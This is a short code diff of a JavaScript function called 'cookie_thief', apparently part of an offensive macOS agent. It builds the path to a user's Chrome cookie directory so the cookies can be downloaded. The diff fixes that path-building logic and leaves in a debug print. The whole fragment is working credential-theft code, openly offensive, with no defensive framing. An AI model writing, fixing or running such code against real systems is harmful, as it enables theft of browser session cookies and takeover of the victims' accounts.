@@ -18,15 +18,15 @@ exports.cookie_thief = function(task, command, params){
         username = config['username'];
     }
     else {
-        username = $.NSUserName().js;
+        username = $.NSUserName();
     }
-    homedir += homedir + username + "/";
+    cookiepath = homedir + username + "/";
 
     if(config.hasOwnProperty("browser") && typeof config['browser'] == 'string'){ browser = config['browser']; }
     if(browser == "chrome") {
         cookiedir = chromeCookieDir;
     }
-    cookieDLPath = homedir + cookiedir;
+    cookieDLPath = cookiepath + cookiedir;
 
     //DEBUG
     console.log(cookieDLPath)
